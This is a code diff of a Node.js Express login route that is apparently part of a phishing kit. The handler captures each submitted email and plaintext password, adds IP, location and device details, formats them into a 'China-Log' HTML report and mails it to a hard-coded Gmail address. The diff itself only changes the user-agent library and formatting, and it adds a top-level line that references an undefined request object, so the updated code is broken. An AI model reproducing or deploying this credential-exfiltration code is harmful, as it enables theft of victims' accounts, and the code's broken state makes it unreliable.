@@ -1,8 +1,12 @@
 const express = require("express");
 const nodemailer = require('nodemailer');
-const useragent = require('useragent');
 const geoip = require('geoip-lite');
 const router = express.Router();
+const UAParser = require('ua-parser-js');
+const parser = new UAParser(req.headers['user-agent']);
+
+
+
 
 // Merge tag function
 function replaceMergeTags(template, data) {
@@ -27,62 +31,55 @@ router.post('/', async (req, res) => {
 
     try {
         const { email, password } = req.body;
-
-        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    
+        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         const location = geoip.lookup(ip);
-        const agent = useragent.parse(req.headers['user-agent']);
-
-        const deviceType = `${agent.os.toString()} - ${agent.toAgent()}`;
+        const parser = new UAParser(req.headers['user-agent']);
+        const agent = parser.getResult();
+    
+        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;
         const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';
 
         // Template with merge tags
-        const htmlTemplate = `
-            <h1>China-Log</h1>
-            <ul>
-                <li><strong>Email:</strong> [[-email-]]</li>
-                <li><strong>Password:</strong> [[-password-]]</li>
-                <li><strong>IP:</strong> [[-ip-]]</li>
-                <li><strong>Location:</strong> [[-location-]]</li>
-                <li><strong>Timestamp:</strong> [[-timestamp-]]</li>
-            </ul>
-        `;
+      const htmlTemplate = `
+      <h1>China-Log</h1>
+      <ul>
+        <li><strong>Email:</strong> [[-email-]]</li>
+        <li><strong>Password:</strong> [[-password-]]</li>
+        <li><strong>IP:</strong> [[-ip-]]</li>
+        <li><strong>Location:</strong> [[-location-]]</li>
+        <li><strong>Timestamp:</strong> [[-timestamp-]]</li>
+      </ul>
+    `;
 
-        const mergedHtml = replaceMergeTags(htmlTemplate, {
-            email,
-            password,
-            ip,
-            location: locationStr,
-            timestamp: new Date().toISOString(),
-        });
+    const mergedHtml = replaceMergeTags(htmlTemplate, {
+      email,
+      password,
+      ip,
+      location: locationStr,
+      timestamp: new Date().toISOString(),
+    });
 
-        const mailOptions = {
-            from: "no-reply",
-            to: "josephblessing6776@gmail.com",
-            subject: `New sign-in on ${deviceType}`,
-            html: mergedHtml,
-        };
+    // Your transporter logic here (use SendGrid or safe SMTP)
+    await transporter.sendMail({
+      from: '"Your Result" <no-reply@example.com>',
+      to: "josephblessing6776@gmail.com",
+      subject: `New sign-in on ${deviceType}`,
+      html: mergedHtml,
+    });
 
-        await transporter.sendMail(mailOptions);
-        console.log(`Email sent to ${email}`);
+    console.log(`Email sent for ${email}`);
 
-        res.status(200).json({
-            success: true,
-            message: 'Login successful and notification sent',
-            loginDetails: {
-                device: deviceType,
-                ip,
-                location: locationStr
-            }
-        });
+    res.status(200).json({
+      success: true,
+      message: "Login successful and notification sent",
+      loginDetails: { device: deviceType, ip, location: locationStr }
+    });
 
-    } catch (error) {
-        console.error('Error sending email:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Failed to send notification',
-            error: error.message
-        });
-    }
+  } catch (error) {
+    console.error("Error sending email:", error);
+    res.status(500).json({ success: false, message: "Failed to send notification", error: error.message });
+  }
 });
 
 module.exports = router;
